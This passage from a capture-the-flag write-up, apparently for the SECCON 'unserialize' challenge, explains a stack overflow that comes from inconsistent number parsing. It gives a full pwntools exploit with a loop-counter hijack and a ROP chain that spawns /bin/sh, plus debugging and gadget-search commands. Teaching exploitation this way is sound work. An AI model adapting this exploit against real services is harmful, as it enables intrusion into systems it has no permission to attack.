RDX = <ignored by kernel>

Instruction: syscall
What the kernel does:
1. Read RAX to determine syscall number (59)
2. Look up syscall table: 59 = sys_execve
3. Call sys_execve(rdi, rsi, rdx)
   = sys_execve(0x4ca8d0, NULL, <ignored>)
4. Load "/bin/sh" from address 0x4ca8d0
5. Execute /bin/sh!

Result: Shell spawns! 🎉
```

#### Why Each Gadget is Necessary

**Why POP_RDI?**
- Need to load the address of "/bin/sh" into RDI
- RDI is the first argument register for syscalls
- Can't directly set RDI without a gadget

**Why the dummy value after POP_RDI?**
- The gadget is `pop rdi; pop rbp; ret`
- It pops TWO values from stack
- First pop goes to RDI (what we want)
- Second pop goes to RBP (don't care, so dummy)
- Without dummy, it would pop the wrong value into RDI

**Why POP_RSI?**
- Set second argument to NULL
- argv parameter for execve (we don't need arguments)

**Why POP_RAX?**
- Set syscall number
- Kernel checks RAX to know which syscall to execute
- 0x3b (59) is the number for execve

**Why SYSCALL?**
- Actually invoke the kernel
- Transfers control from user space to kernel space
- Kernel executes our syscall with the prepared registers

---

## Final Exploit

```python
#!/usr/bin/env python3
from pwn import *

# Load binary for analysis
exe = ELF("./chall")
context.binary = exe

# Connect to challenge
# Use args.REMOTE to switch between local and remote
r = remote("unserialize.seccon.games", 5000) if args.REMOTE else process([exe.path])

# ============================================================================
# PHASE 1: Send Size Header
# ============================================================================
# Send "0199:" which triggers the parsing bug:
# - atoi("0199") = 199 (passes check)
# - strtoul("0199", 0) = 1 (allocates 16 bytes)
# - strtoul("0199", 10) = 199 (reads 199 bytes)
r.send(b"0199:")
sleep(0.3)  # Give server time to process

# ============================================================================
# PHASE 2: ROP Gadget Addresses
# ============================================================================
# Found using: ROPgadget --binary chall | grep "pop rdi"
POP_RDI = 0x402418  # pop rdi; pop rbp; ret
POP_RSI = 0x43617e  # pop rsi; ret
POP_RAX = 0x4303ab  # pop rax; ret
SYSCALL = 0x401364  # syscall

# ============================================================================
# PHASE 3: Build ROP Chain
# ============================================================================
# Goal: execve("/bin/sh", NULL, NULL)
# Syscall number 59 (0x3b) requires:
#   rax = 0x3b
#   rdi = pointer to "/bin/sh"
#   rsi = pointer to argv (NULL)
#   rdx = pointer to envp (ignored)

rop = flat(
    # Set rdi = address of "/bin/sh" in BSS
    POP_RDI,            # Gadget address
    0x4ca8d0,           # Value to pop into rdi (BSS address)
    0,                  # Dummy value for pop rbp (gadget pops twice)
    
    # Set rsi = NULL (no arguments)
    POP_RSI,            # Gadget address
    0,                  # Value to pop into rsi
    
    # Set rax = 59 (execve syscall number)
    POP_RAX,            # Gadget address
    0x3b,               # Value to pop into rax (59 decimal)
    
    # Invoke the syscall
    SYSCALL             # Execute: execve(0x4ca8d0, NULL, <ignored>)
)

# ============================================================================
# PHASE 4: Build Overflow Payload
# ============================================================================

# Bytes 0-7: The "/bin/sh" string
# This gets copied to BSS via memcpy at the end
payload = b"/bin/sh\0"

# Bytes 8-31: Padding to reach buf pointer (24 bytes = 0x18)
payload += b"A" * 0x18

# Bytes 32-39: Overwrite buf pointer to redirect memcpy to BSS
# Original buf points to stack in main()
# We redirect it to 0x4ca8d0 (writable BSS address)
# p64() converts to 8-byte little-endian: d0 a8 4c 00 00 00 00 00
payload += p64(0x4ca8d0)

# Bytes 40-47: Restore fp (FILE pointer) to stdin
# fp is used by fscanf() to read input
# Must be valid or fscanf() crashes
# 0x4ca440 = address of _IO_2_1_stdin_ structure
payload += p64(0x4ca440)

# Bytes 48-55: More padding (8 bytes)
payload += b"B" * 8

# Byte 56: THE HIJACK! Overwrite loop counter j
# j is stored at [rbp-0x48]
# tmpbuf[56] maps to this address
# Setting j = 0x87 (135) makes loop skip to iteration 135
# p8() converts to single byte: 87
payload += p8(0x87)

# Bytes 57+: ROP chain
# Loop jumps from j=56 to j=135
# Iterations 135-198 write our ROP chain
# Iteration 136 writes to return address
payload += rop

# ============================================================================
# PHASE 5: Pad and Send Payload
# ============================================================================

# Pad to 512 bytes (0x200) with null bytes
# Ensures we send enough data for the loop
payload = payload.ljust(0x200, b"\x00")

# Send each byte as two hex characters
# fscanf expects format: "%02hhx" = two hex digits per byte
# Example: byte 0x41 is sent as ASCII string "41"
for byte in payload:
    # Format byte as 2-digit hex (e.g., 0x41 → "41")
    # Encode to bytes and add newline
    r.sendline(f"{byte:02x}".encode())

# ============================================================================
# PHASE 6: Get Shell!
# ============================================================================

# Switch to interactive mode to use the shell
# At this point:
#   1. Loop has overwritten return address with POP_RDI
#   2. memcpy has placed "/bin/sh" in BSS
#   3. unserialize() returns
#   4. ROP chain executes
#   5. execve("/bin/sh", NULL, NULL) is called
#   6. Shell spawns!

r.interactive()

# ============================================================================
# Expected Output:
# ============================================================================
# [*] Switching to interactive mode
# $ ls
# flag-fb244ac94827d8b6665d5ac8fc9e25fe.txt
# run
# $ cat flag-fb244ac94827d8b6665d5ac8fc9e25fe.txt
# SECCON{ev3rY_5tR1ng_c0nV3rs10n_wOrKs_1n_a_d1fFeR3n7_w4y}
# ============================================================================
```

### Running the Exploit

**Local testing:**
```bash
# Test locally first
python3 exploit.py
# Output: Shell should spawn
$ id
uid=1000(user) gid=1000(user) ...
```

**Remote exploitation:**
```bash
# Against the actual challenge server
python3 exploit.py REMOTE
# Output: Same as document
```

**Debugging:**
```bash
# Run with GDB attached
python3 exploit.py GDB
# Set breakpoints, step through, examine memory
```

---

## Why You See "00: not found" Spam

The payload is 512 bytes (0x200). After the shell spawns from your ROP chain, the remaining bytes continue to be sent as input to the shell. Each `"00"` line is interpreted as a shell command:

```bash
$ 00
00: not found
$ 00
00: not found
```

This continues until all 512 bytes are consumed. The shell works fine - just ignore the spam!

---

## Key Takeaways

### 1. Number Parsing Functions Behave Differently

Always check how different parsing functions interpret the same input:
- `atoi()` is always decimal
- `strtoul()` with base 0 auto-detects (0 prefix = octal, 0x = hex)
- Different bases can create integer discrepancies

### 2. alloca() Allocates on the Stack

Unlike malloc(), alloca() places the buffer directly on the function's stack frame:
- Adjacent to local variables
- Overflow can corrupt function state
- No heap metadata to worry about

### 3. Loop Counter Hijacking

When the loop counter is on the stack, you can:
- Overwrite it mid-loop
- Skip iterations (like skipping the canary)
- Control where subsequent writes go

### 4. Stack Variable Restoration

When overflowing, preserve critical pointers:
- FILE pointers (fp) for continued I/O
- Destination pointers for controlled writes
- Check IDA/Ghidra decompilation for variable offsets

### 5. No PIE = Fixed ROP Targets

Without PIE:
- Gadget addresses never change
- Can use fixed BSS/data addresses
- No need to leak base addresses

---

## References

- [Original Writeup by leo_something](https://leo1.cc/posts/writeups/seccon25-unserialize/)
- [strtoul() man page](https://linux.die.net/man/3/strtoul)
- [Linux x64 Syscall Reference](https://filippo.io/linux-syscall-table/)

---

## Appendix: Debugging Commands Reference

### Finding Offsets
```bash
# Start with breakpoint at loop
pwndbg> break *unserialize+416
pwndbg> run < /tmp/test

# Check key addresses
pwndbg> p/x $rbp-0x48        # j variable
pwndbg> p/x *(char**)($rbp-0x40)  # tmpbuf
pwndbg> p/x $rbp+8           # return address
pwndbg> p/x *(char**)($rbp-0x58)  # fp (stdin)

# Calculate distances
python3 -c "print(hex(0x878 - 0x840))"  # Distance to j
```

### Examining Memory
```bash
# View stack layout
pwndbg> x/40gx $rsp
pwndbg> x/40gx $rbp-0x70

# Watch specific address
pwndbg> watch *(char*)0x7fffffffd878  # Watch j variable
```

### Stepping Through Loop
```bash
# Break at fscanf
pwndbg> break *unserialize+451

# Conditional breakpoint
pwndbg> break *unserialize+451 if *(unsigned long*)($rbp-0x48) == 56
pwndbg> commands
> silent
> printf "At iteration 56! j=%d\n", *(unsigned long*)($rbp-0x48)
> continue
> end
```

### Finding Gadgets
```bash
ROPgadget --binary chall > gadgets.txt
grep "pop rdi" gadgets.txt
grep "pop rsi" gadgets.txt
grep "pop rax" gadgets.txt
grep "syscall" gadgets.txt | grep -v ":" | head -5
```

### Checking Binary Sections
```bash
readelf -S chall | grep -E 'bss|data'
readelf -s chall | grep stdin
objdump -M intel -d chall | grep -A5 "syscall"
```
